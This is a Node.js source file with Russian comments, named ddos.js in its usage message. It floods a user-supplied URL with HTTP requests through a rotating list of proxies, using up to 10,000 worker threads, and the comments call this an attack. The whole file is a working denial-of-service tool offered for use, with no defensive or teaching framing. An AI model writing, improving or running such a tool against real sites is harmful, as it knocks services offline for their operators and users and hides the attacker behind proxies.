const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const { Worker, isMainThread, parentPort } = require('worker_threads');

// Установим максимальное количество потоков, которое можно запустить
const MAX_THREADS = 10000; // Максимальное количество потоков

// Функция для чтения прокси из файла
function readProxies(filename) {
    return new Promise((resolve, reject) => {
        const proxies = [];
        const rl = readline.createInterface({
            input: fs.createReadStream(filename),
            crlfDelay: Infinity
        });

        rl.on('line', (line) => {
            if (line.trim()) {
                proxies.push(line.trim());
            }
        });

        rl.on('close', () => resolve(proxies));
        rl.on('error', (err) => reject(err));
    });
}

// Функция для отправки HTTP запроса с прокси
async function sendRequest(url, proxy, method = 'GET', data = null) {
    try {
        const startTime = Date.now();
        console.log(`Connecting to ${url} through proxy ${proxy}...`);

        const response = await axios({
            method,
            url,
            data,
            proxy: {
                host: proxy.split(':')[0],
                port: parseInt(proxy.split(':')[1])
            },
            timeout: 5000 // Таймаут в 5 секунд
        });

        const duration = Date.now() - startTime;
        console.log(`[${duration}ms] Request through ${proxy} - Status: ${response.status} ${getHttpStatusMessage(response.status)}`);
    } catch (error) {
        handleError(error, proxy);
    }
}

// Логирование ошибок
function handleError(error, proxy) {
    if (error.response) {
        console.log(`Error with proxy ${proxy}: ${error.response.status} ${getHttpStatusMessage(error.response.status)}`);
    } else if (error.code === 'ECONNABORTED') {
        console.log(`Timeout with proxy ${proxy}.`);
    } else {
        console.log(`Error with proxy ${proxy}: ${error.message}`);
    }
}

// Получение читаемого сообщения для HTTP статусов
function getHttpStatusMessage(statusCode) {
    const statusMessages = {
        200: 'OK',
        404: 'Not Found',
        403: 'Forbidden',
        500: 'Internal Server Error',
        502: 'Bad Gateway',
        503: 'Service Unavailable',
        504: 'Gateway Timeout'
    };
    return statusMessages[statusCode] || 'Unknown Status';
}

// Функция для многопоточной обработки запросов с прокси
function startWorker(url, duration, proxies, workerId) {
    let currentProxyIndex = 0;
    const endTime = Date.now() + duration * 1000;

    function processRequests() {
        if (Date.now() < endTime) {
            const proxy = proxies[currentProxyIndex];
            sendRequest(url, proxy)
                .finally(() => {
                    currentProxyIndex = (currentProxyIndex + 1) % proxies.length; // цикличное использование прокси
                    setImmediate(processRequests); // продолжить с того места, где остановились
                });
        } else {
            console.log(`Worker ${workerId} finished.`);
        }
    }

    processRequests();
}

// Основная функция для запуска атаки
async function attack(url, duration, proxies, numThreads) {
    // Ограничиваем количество потоков до MAX_THREADS
    const threadsToUse = Math.min(numThreads, MAX_THREADS);
    console.log(`Loaded ${proxies.length} proxies. Starting attack with ${threadsToUse} threads...`);

    // Разделяем задачу между несколькими потоками
    const workers = [];
    for (let i = 0; i < threadsToUse; i++) {
        const worker = new Worker(__filename, { workerData: { url, duration, proxies, workerId: i + 1 } });
        workers.push(worker);
    }

    // Ожидаем завершения всех потоков
    Promise.all(workers.map(worker => new Promise(resolve => worker.on('exit', resolve))))
        .then(() => console.log('All workers finished.'));
}

// Запуск скрипта
async function start() {
    const args = process.argv.slice(2);
    const url = args[0]; // URL для атаки
    const duration = parseInt(args[1], 10); // Длительность атаки в секундах
    const numThreads = parseInt(args[2], 10) || 10; // Количество потоков (по умолчанию 10)

    // Ограничение на количество потоков, если оно превышает MAX_THREADS
    if (numThreads > MAX_THREADS) {
        console.log(`Warning: Maximum allowed threads is ${MAX_THREADS}. Limiting threads to ${MAX_THREADS}.`);
    }

    if (!url || isNaN(duration) || duration <= 0) {
        console.log('Usage: node ddos.js <URL> <duration in seconds> <numThreads>');
        process.exit(1);
    }

    try {
        const proxies = await readProxies('proxy.txt');
        await attack(url, duration, proxies, numThreads);
    } catch (error) {
        console.error('Error reading proxies:', error);
    }
}

// Если скрипт запущен как воркер
if (!isMainThread) {
    const { url, duration, proxies, workerId } = require('worker_threads').workerData;
    startWorker(url, duration, proxies, workerId);
} else {
    start();
}
